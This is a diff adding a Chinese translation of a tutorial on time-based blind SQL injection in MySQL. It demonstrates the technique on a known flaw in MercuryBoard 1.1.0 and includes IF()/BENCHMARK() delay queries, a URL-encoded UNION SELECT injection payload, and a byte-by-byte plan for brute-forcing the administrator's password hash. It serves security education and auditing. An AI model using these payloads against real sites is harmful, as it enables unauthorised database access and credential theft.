@@ -1,0 +1,171 @@
+MySQL数据库盲注技术
+文章作者：Zeelock
+译文作者：漂浮的尘埃[S.S.T]（www.cnsst.net）
+
+注意：译文作者拥有该文章之中文版版权，本文章首发脚本安全小组，后由译文作者友情提交到邪恶八进制信息安全团队，中文版版权归脚本安全小组及漂浮的尘埃[S.S.T]所有，转载请尊重版权。
+
+关键字：Benchmark(), IF(), "Blind Injection", "Time Delay", waitfor
+
+"Validate anything can be passed. Security lays in the inputs. " - zk
+所有的过滤都可能被突破。安全取决于输入。－zk
+
+摘要：
+MySQL数据库用SQL注射并不容易：当UNION出现在两个不同类型的数据列中，没有一种方法
+可以从查询里传递的参数里查询显示的错误。当我们审核php/MySQL应用程序的代码，我们发现一个注射漏洞却
+是不可利用的这出现过很多，因为在脚本结束前我们不能够看到输出结果或者我们看到的都是一个错误信息导致找到的值通过不同的列表传递给多重查询。
+基于这个原因用SELECT...UNION是不够的。
+
+
+注射工具盒
+当我们得到没有错误提示，一个普通的注射总是用UNION SELECT [null,null,..到前面选择里正确列的数字]/* 去看，
+因此我们可以更深入。假如没有输出结果显示，即使我们准确地知道每个表里每个列的名字，也几乎不可能得到内容。
+
+用codebug.org发现的MercuryBoard里不可利用的漏洞做例子，我将会一步一步演示如何从被里发现的不可利用的漏洞里找到密码散列。
+我假设这个表的名字是已知的。（在审核一个开放脚本资源，或者调试默认选项是否活动是，这是都一种正常的假设）
+
+漏洞
+MercuryBoard v. 1.1.0 Alberto Trivero发现存在一个SQL注入漏洞，当post.php包含被设置成'reply'，并且参数't'被传递。
+当用户登陆进行以下操作时，结果将会发生一个错误：
+http://www.site.com/mercuryboard ... amp;s=reply&t=1'
+这个结果看起来像是不能被利用的。
+
+准备好盲目性
+首先用数据库低权限的用户完整安装有漏洞的Mercuryboard版本。
+
+|---|数据库名字是'mercuryboard'|---| （让我显示表名）
+
+mysql> SHOW TABLES;
++-------------------+
+| Tables_in_mercury |
++-------------------+
+| mb_active |
+| mb_attach |
+| mb_forums |
+| mb_groups |
+| mb_help |
+| mb_logs |
+| mb_membertitles |
+| mb_pmsystem |
+| mb_posts |
+| mb_replacements |
+| mb_settings |
+| mb_skins |
+| mb_subscriptions |
+| mb_templates |
+| mb_topics |
+| mb_users |
+| mb_votes |
++-------------------+
+17 rows in set (0.00 sec)
+
+|---| 你看到的当前用户是普通用户|---| （不会作为root运行）
+mysql> SELECT USER();
++---------------+
+| USER() |
++---------------+
+| 123@localhost |
++---------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT password,USER() FROM mysql.user;
+ERROR 1142: select command denied to user: '123@localhost' for table 'user'
+mysql>
+
+|---| 下面的查询将显示管理员的散列的第一个字节|---|
+
+mysql> SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;
++------------------------------+
+| SUBSTRING(user_password,1,1) |
++------------------------------+
+| 5 |
++------------------------------+
+1 row in set (0.00 sec)
+
+|---| 下面显示管理员散列ASCII的第一个字节|---|
+
+mysql> SELECT ASCII('5');
++------------+
+| ASCII('5') |
++------------+
+| 53 |
++------------+
+1 row in set (0.00 sec)
+
+区别
+目标是找到一种以某种方式建议的方法，以至我们寻找的内容是正确的。怎么可能知道管理员散列的第一个
+字节是否等于'5'?在NGSS资料里，假如内容与注射的匹配，作者将简单的使查询延迟。在mssql里这个会用一个条件
+IF [QUERY] waitfor [TIME]来追加，而mysql不支持'waitfor'。
+
+在下面查询中我成功的用IF()函数跟随一个BENCHMARK()函数来创建5秒钟的延迟。当前用户可以用低权限
+执行（当然假如你可以SELECT你就可以执行BENCHMARK()函数）。
+
+|---|传递一个错误的数字 |---| (CHAR(52) is equal to '4')
+
+mysql> Select active_id FROM mb_active UNION SELECT IF(SUBSTRING(user_password,1
+,1) = CHAR(52),BENCHMARK(5000000,ENCODE('Slow Down','by 5 seconds')),null) FROM
+mb_users WHERE user_group = 1;
++-----------+
+| active_id |
++-----------+
+| 3 |
+| 0 |
++-----------+
+2 rows in set (0.00 sec)
+
+在前面的例子中BENCHMARK()函数没有被执行（(耗时
+0.00 sec). ）
+
+|---| 传递相匹配内容|---| (BENCHMARK() 被执行)
+
+mysql> Select active_id FROM mb_active UNION SELECT IF(SUBSTRING(user_password,1
+,1) = CHAR(53),BENCHMARK(5000000,ENCODE('Slow Down','by 5 seconds')),null) FROM
+mb_users WHERE user_group = 1;
++-----------+
+| active_id |
++-----------+
+| 3 |
+| 0 |
++-----------+
+2 rows in set (5.36 sec)
+
+在前面的例子里BENCHMARK()函数延迟查询5.36s。
+
+对GET req修补
+为能成功注射SQL指令我们不得不清除任何单个回显的request.
+
+
+|---| 清除回显|---|
+
+mysql> Select active_id FROM mb_active UNION SELECT IF(SUBSTRING(user_password,1
+,1) = CHAR(53),BENCHMARK(1000000,MD5(CHAR(1))),null) FROM mb_users WHERE user_gr
+oup = 1;
++-----------+
+| active_id |
++-----------+
+| 3 |
+| 0 |
++-----------+
+2 rows in set (4.65 sec)
+
+mysql>
+
+漏洞利用
+首先我们必须登陆一个已注册的用户。
+http://127.0.0.1/mercuryboard/in ... UNION%20SELECT%20IF
+(SUBSTRING(user_password,1,1)%20=%20CHAR(53),BENCHMARK(1000000,MD5(CHAR(1))),
+null),null,null,null,null%20FROM%20mb_users%20WHERE%20user_group%20=%201/*
+
+我们可以看到慢下2秒导致第一字节是CHAR(53), 5。
+
+暴力破解
+一个字母一个字母地重建内容是必须的，仅仅一个简单的perl脚本执行GET 请求并等待一个字节一个字节
+的回答{..SUBSTRING(strn,[1,2,3..n],1)..}，假如这个回应被延迟了7-10秒，我们有权利填充。暴力破解
+可以得到MD5散列，32字节。
+
+0 to 9 --> ASCII 48 to 57
+a to z --> ASCII 97 to 122
+
+最差的结果是36个请求，每个请求3秒加上延迟才是正确的字节，得到完整散列为((3*35)+10)*32= 3622 秒（1小时）
+
+结论
+Mysql可以被盲注。
